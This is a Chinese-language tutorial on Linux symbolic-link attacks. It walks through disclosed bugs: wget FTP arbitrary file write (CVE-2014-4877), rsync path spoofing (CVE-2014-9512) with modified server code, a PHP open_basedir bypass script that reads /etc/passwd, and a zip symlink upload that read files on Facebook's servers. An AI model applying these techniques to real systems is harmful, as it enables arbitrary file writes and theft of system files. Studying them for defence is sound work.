# linux symbolic link attack tutorial

0×00 前言
=======

* * *

Linux作为应用最广泛的开源系统，其中独特的文件系统可以算是支撑Linux强大功能 的核心组件之一，而在文件系统中，符号链接(symbolic link )形如"月光宝盒"般可以穿 梭时空，自由穿越森严的路径限制，此一特性，使其地位在整个Linux系统中占有重要 一席，本文将通过实际分析与研究，深入探讨因对符号链接处理不当，可能造成的各类 安全问题，以引发对此类问题的重视。

0×01 客户端
========

* * *

客户端递归处理文件时,通过符号链接穿越可造成任意文件写入,代码执行。

案例:

1. Wget ftp symbolic link attack (CVE-2014-4877)
------------------------------------------------

* * *

wget 递归下载ftp站点时,如 wget -m ftp://127.0.0.1,在服务端伪造如下数据

```
lrwxrwxrwx 1 root root 33 Oct 11 2013 fakedir -> /tmp
drwxrwxr-x 15 root root 4096 Oct 11 2013 fakedir

```

会在本地建立一个名称为fakedir的symbolic link ,指向/tmp 目录,当wget 发送 cwd 指令递归进入fakedir 在发送 LIST 指令。此时可以伪造一个恶意文件或者

目录比如:

```
-rwx------ 1 root root 21 Aug 29 2013 pwned

```

RETR 指令下载pwned 文件时,返回文件内容(二进制或者文本)。即可欺骗wget 客户端任意目录写入。

具体利用脚本: https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py

漏洞演示:

```
Server(attacker)  wget-symlink_attack_exploit.py
Client(victim)    wget -m ftp://127.0.0.1

```

![enter image description here](http://drops.javaweb.org/uploads/images/133b64e743f5057307d3cd8457a33c679acf11b3.jpg)

2:Rsync path spoofing attack vulnerability(CVE-2014-9512 )
----------------------------------------------------------

* * *

笔者分析wget漏洞之后,发现rsync递归同步文件时,同样可以用符号链接来 欺骗路径,由于rsync双向文件处理算法比较复杂,无法直接用字符串伪造文件流。 首先rsync共享文件夹新建symbolic link 指向/root/,

```
[root@pentest rsync]# ls  -lh
total 8.0K
-rw-r--r-- 1 root root    2 Oct 31 03:16 1.txt
lrwxrwxrwx 1 root root    6 Oct 31 05:09 fakedir -> /root/
drwxr-xr-x 2 root root 4.0K Oct 31 05:08 truedir

```

truedir 中写入测试文件

```
[root@pentest rsync]# cd  truedir/
[root@pentest truedir]# ls
[root@pentest truedir]# echo rsync  test  >  pwned
[root@pentest truedir]# ls -lh
total 4.0K
-rw-r--r-- 1 root root 11 Oct 31 05:17 pwned
[root@pentest truedir]# 

```

再修改服务端发送文件列表的代码

```
file: rsync-3.1.1/flist.c    line:394
static void send_file_entry(int f, const char *fname, struct file_struct *file,
#ifdef SUPPORT_LINKS
                const char *symlink_name, int symlink_len,
#endif
                int ndx, int first_ndx)
{
  if(strcmp(fname,"turedir/pwned") == 0){

    fname="fakedir/pwned";  // symbolic link 
//change  file  true path(truedir) to  symbolic link  (fakedir)
)
}

```

由于服务端有严格的数据校验,此时会报错 "received request to transfer non-regular file fakedir/pwned.test 7 [sender]",导致客户端同步无法执行 但是对于攻击者来说,服务端是可控的,找到对应代码直接注释。

```
/* if (iflags & ITEM_TRANSFER) {
        int i = ndx - cur_flist->ndx_start;
        if (i < 0 || !S_ISREG(cur_flist->files[i]->mode)) {
            rprintf(FERROR,
                "received request to transfer non-regular file: %d [%s]\n",
                ndx, who_am_i());
            exit_cleanup(RERR_PROTOCOL);
        }
    }
*/

```

漏洞演示:

![enter image description here](http://drops.javaweb.org/uploads/images/842b745f1c8666ba3cd7cf9f772a34efa4c895e8.jpg)

client(victim):

![enter image description here](http://drops.javaweb.org/uploads/images/124331bfde1d14e5ddecbb180f7ea8d347b54399.jpg)

0×02 web 程序
===========

* * *

当通过http访问文件时,web server 对符号链接处理不当可能导致越权访问,文件 读取等安全隐患。

案例:

1. php 通用绕过 open_basedir 读取任意文件
-------------------------------

* * *

使用函数symlink 与 mkdir 创建一个指向目标的符号链接,代码如下

```
<?php
mkdir("abc");
chdir("abc");
mkdir("etc");
chdir("etc");
mkdir("passwd");
chdir("..");
mkdir("abc");
chdir("abc");
mkdir("abc");
chdir("abc");
mkdir("abc");
chdir("abc");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("abc/abc/abc/abc","tmplink");
symlink("tmplink/../../../etc/passwd", "exploit");
unlink("tmplink");  //删除
mkdir("tmplink");
?>

```

生成文件

```
drwxr-xr-x 4 www www 512 Oct 20 00:37 abc
lrwxr-xr-x 1 www www 27 Oct 20 00:37 exploit -> tmplink/../../../etc/passwd
- -rw-r--r-- 1 www www 356 Oct 20 00:32 kakao.php
- -rw-r--r-- 1 www www 45 Oct 20 00:26 sym.php
drwxr-xr-x 2 www www 512 Oct 20 00:37 tmplink

```

exploit 已经指向/etc/passwd,通过web server 如Apache 直接静态访问,可以绕过php open_basedir 保护读取文件。

2. facebook 本地文件读取
------------------

* * *

当服务端会自动解压zip,tar 等支持符号链接的压缩格式时。可以通过符号链接读取服务器文件 例如facebook 本地文件读取

```
1. 创建一个符号链接文件指向/etc/passwd 

ln -s /etc/passwd link 

2. 压缩文件，同时保留链接 
zip --symlinks test.zip link 

3. 上传test.zip文件，系统会自动解压缩 

4. 页面当中会返回/etc/passwd的内容

```

如图

![enter image description here](http://drops.javaweb.org/uploads/images/13543f8e9b6b0fb5d794287b3d4e6d0ab5996fe4.jpg)

0×03 参考链接
=========

* * *

1:CVE-2014-4877 wget ftp下载文件夹链接欺骗漏洞分析 http://xteam.baidu.com/?p=30

2:Rsync path spoofing attack vulnerability http://xteam.baidu.com/?p=169

3:Php open_basedir bypass http://cxsecurity.com/issue/WLB-2009110068

4:Reading local files from Facebook's server http://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html